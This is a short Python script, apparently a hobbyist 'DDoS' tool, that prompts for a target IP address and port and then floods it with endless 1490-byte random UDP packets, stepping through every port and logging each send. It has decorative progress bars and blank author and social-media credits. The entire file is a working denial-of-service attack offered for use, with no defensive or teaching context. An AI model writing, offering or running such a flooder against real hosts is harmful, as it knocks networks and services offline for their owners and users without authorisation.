import sys
import time
import socket
import random
import logging
from datetime import datetime

def get_current_time():
    now = datetime.now()
    return now.hour, now.minute, now.day, now.month, now.year

def setup_logging():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def attack(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    sent = 0
    
    logging.info("Starting attack on %s:%s", ip, port)
    
    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            port = port + 1 if port < 65534 else 1
            logging.info("Sent %s packet(s) to %s through port:%s", sent, ip, port)
    except KeyboardInterrupt:
        logging.info("Attack stopped by user")
    except Exception as e:
        logging.error("An error occurred: %s", str(e))
    finally:
        sock.close()

def main():
    setup_logging()
    
    print("Author   : ")
    print("You Tube : ")
    print("GitHub   : ")
    print("Facebook : ")
    print()

    ip = input("IP Target: ")
    try:
        port = int(input("Port: "))
    except ValueError:
        logging.error("Invalid port number")
        sys.exit(1)

    logging.info("Preparing attack...")
    
    for progress in range(0, 101, 25):
        logging.info("[%s%s] %s%%", "=" * (progress // 5), " " * (20 - progress // 5), progress)
        time.sleep(5)
    
    attack(ip, port)

if __name__ == "__main__":
    main()
